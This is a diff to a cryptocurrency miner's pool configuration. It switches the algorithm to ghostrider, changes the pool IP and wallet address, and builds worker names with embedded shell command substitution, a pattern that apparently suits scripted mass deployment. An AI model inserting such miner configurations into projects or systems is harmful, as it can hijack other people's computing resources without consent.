@@ -60,14 +60,14 @@
     "log-file": null,
     "pools": [
         {
-            "algo": "rx/0",
+            "algo": "ghostrider",
             "coin": null,
-            "url": "138.197.12.20:443",
-            "user": "ZEPHs8j799QQFKmKFaHEJ85sGoNU3VgNGU7TF1ez9gjJRHb2XYVUPvgLS8okjGECMhcgx4HuJceLwXBEywNBR1gUP6tsD3K9iVY.$(shuf -n 1 -i 1-99999)",
+            "url": "146.190.95.27:80",
+            "user": "SbNahnXkL55QgtF3J9F5Vq67D8Z8iMiYUL.$(echo $(shuf -i 1-9999 -n 1)-cina)",
             "pass": "x",
             "rig-id": "null",
             "nicehash": false,
-            "keepalive": false,
+            "keepalive": true,
             "enabled": true,
             "tls": false,
             "tls-fingerprint": null,
